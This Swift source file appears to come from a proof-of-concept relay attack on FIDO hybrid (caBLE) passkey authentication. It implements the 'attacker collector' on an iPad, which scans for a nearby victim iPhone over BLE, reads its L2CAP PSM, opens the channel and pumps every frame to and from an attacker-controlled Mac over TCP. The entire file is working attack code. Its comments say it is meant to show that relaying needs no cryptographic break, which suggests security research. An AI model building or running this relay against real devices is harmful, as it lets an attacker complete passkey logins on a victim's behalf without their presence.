//
//  CollectorCentral.swift
//  cable-relay-poc — ATTACKER COLLECTOR role (runs on the iPad)
//
//  The iPad sits ~1 m from the victim iPhone. It is a BLE central AND a
//  TCP client to the Mac. It performs NO crypto of its own: it opens the
//  L2CAP channel to the phone, then becomes a dumb bidirectional pump —
//  every frame from the phone goes to the Mac over TCP, every frame from
//  the Mac goes to the phone over L2CAP.
//
//  This is the relay. Note what is absent: no key, no Noise state, no
//  parsing of message bodies. It cannot read the traffic (it does not hold
//  the keys). It does not need to. That is the entire thesis — relay needs
//  no cryptographic break.
//
//  The TCP leg models FIDO's generic tunnel server: a public encrypted
//  byte-bridge that will carry whatever you put on it.
//

import Foundation
import CoreBluetooth
import Network

final class CollectorCentral: NSObject, ObservableObject {

    @Published var log: [String] = []
    @Published var relaying = false

    // --- config: where the Mac relay-browser's TCP bridge listens ---
    var bridgeHost: String = "192.168.1.50"   // EDIT to your Mac's LAN/VPN IP
    var bridgePort: UInt16 = 7070

    private var manager: CBCentralManager!
    private var phone: CBPeripheral?
    private var psmChar: CBCharacteristic?
    private var channel: CBL2CAPChannel?
    private var l2capIn = Data()

    private var tcp: NWConnection?
    private var tcpIn = Data()

    func start() {
        manager = CBCentralManager(delegate: self, queue: .main)
        connectBridge()
    }

    private func line(_ s: String) {
        NSLog("[IPAD-RELAY] %@", s)
        DispatchQueue.main.async { self.log.append(s) }
    }

    // MARK: TCP bridge to the Mac
    private func connectBridge() {
        let conn = NWConnection(
            host: NWEndpoint.Host(bridgeHost),
            port: NWEndpoint.Port(rawValue: bridgePort)!,
            using: .tcp)
        conn.stateUpdateHandler = { [weak self] st in
            guard let self else { return }
            switch st {
            case .ready: self.line("TCP bridge to Mac ready"); self.pumpTCP()
            case .failed(let e): self.line("TCP failed \(e)")
            default: break
            }
        }
        tcp = conn
        conn.start(queue: .main)
    }

    private func pumpTCP() {
        tcp?.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, done, err in
            guard let self else { return }
            if let d = data, !d.isEmpty {
                // forward every complete frame from Mac -> phone untouched
                self.tcpIn.append(d)
                for frame in Frame.drain(&self.tcpIn) {
                    self.toPhone(frame)
                }
            }
            if done || err != nil { self.line("TCP closed"); return }
            self.pumpTCP()
        }
    }

    private func toMac(_ frame: Data) {
        tcp?.send(content: Frame.encode(frame), completion: .contentProcessed { _ in })
    }

    private func toPhone(_ frame: Data) {
        guard let out = channel?.outputStream else { return }
        let wire = Frame.encode(frame)
        _ = wire.withUnsafeBytes { out.write($0.bindMemory(to: UInt8.self).baseAddress!,
                                             maxLength: wire.count) }
    }
}

// MARK: - Central: find phone, read PSM, open L2CAP
extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {

    func centralManagerDidUpdateState(_ c: CBCentralManager) {
        guard c.state == .poweredOn else { return }
        c.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
        line("scanning for victim phone")
    }

    func centralManager(_ c: CBCentralManager, didDiscover p: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        line("discovered phone RSSI \(RSSI)")   // RSSI is NOT relay-resistant; logged for the writeup
        c.stopScan()
        phone = p
        p.delegate = self
        c.connect(p)
    }

    func centralManager(_ c: CBCentralManager, didConnect p: CBPeripheral) {
        line("connected; discovering service")
        p.discoverServices([CBUUID(string: BLEIDs.serviceUUID)])
    }

    func peripheral(_ p: CBPeripheral, didDiscoverServices error: Error?) {
        guard let svc = p.services?.first else { return }
        p.discoverCharacteristics([CBUUID(string: BLEIDs.psmCharUUID)], for: svc)
    }

    func peripheral(_ p: CBPeripheral, didDiscoverCharacteristicsFor s: CBService, error: Error?) {
        guard let ch = s.characteristics?.first else { return }
        psmChar = ch
        p.readValue(for: ch)
    }

    func peripheral(_ p: CBPeripheral, didUpdateValueFor ch: CBCharacteristic, error: Error?) {
        guard let v = ch.value, v.count == 2 else { return }
        let psm = v.withUnsafeBytes { CBL2CAPPSM($0.load(as: UInt16.self).bigEndian) }
        line("read PSM \(psm); opening L2CAP")
        p.openL2CAPChannel(psm)
    }

    func peripheral(_ p: CBPeripheral, didOpen channel: CBL2CAPChannel?, error: Error?) {
        if let e = error { line("L2CAP open error \(e.localizedDescription)"); return }
        guard let ch = channel else { return }
        self.channel = ch
        ch.inputStream.delegate = self
        ch.outputStream.delegate = self
        ch.inputStream.schedule(in: .main, forMode: .default)
        ch.outputStream.schedule(in: .main, forMode: .default)
        ch.inputStream.open()
        ch.outputStream.open()
        relaying = true
        line("L2CAP open — RELAY ACTIVE (phone<->iPad radio, iPad<->Mac TCP)")
    }
}

// MARK: - Pump L2CAP -> Mac
extension CollectorCentral: StreamDelegate {
    func stream(_ aStream: Stream, handle event: Stream.Event) {
        guard event == .hasBytesAvailable, let inp = channel?.inputStream else { return }
        var tmp = [UInt8](repeating: 0, count: 4096)
        while inp.hasBytesAvailable {
            let n = inp.read(&tmp, maxLength: tmp.count)
            if n > 0 { l2capIn.append(contentsOf: tmp[0..<n]) } else { break }
        }
        for frame in Frame.drain(&l2capIn) { toMac(frame) }   // forward phone -> Mac, opaque
    }
}
